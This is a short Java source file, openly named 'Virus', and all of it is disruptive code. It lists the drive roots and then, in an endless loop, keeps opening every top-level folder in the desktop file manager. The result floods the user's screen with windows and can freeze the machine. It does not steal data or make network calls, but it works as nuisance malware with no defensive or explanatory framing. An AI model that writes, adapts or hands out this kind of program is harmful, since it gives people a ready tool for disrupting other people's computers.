
package virus;

import java.awt.Desktop;
import java.io.File;

public class Virus {
    
    static String[] a;
    static File file;
    
  
    public static void main(String[] args) {
        try{
        
            File[] paths;
            paths = File.listRoots();
        
            for(File path : paths){
                a = path.list();
            
                while(true){
                    for(int x=1;a.length >x;x++){
                        file=new File(path + a[x]);
                    
                        if(file.isDirectory()){
                            Desktop desktop = Desktop.getDesktop();
                    
                            File dirToOpen = new File(path + a[x]);
                            desktop.open(dirToOpen);
                        }
                    }
                }
            }
        }catch(Exception e){
            
            System.out.println(e);
        }
    }
    
}
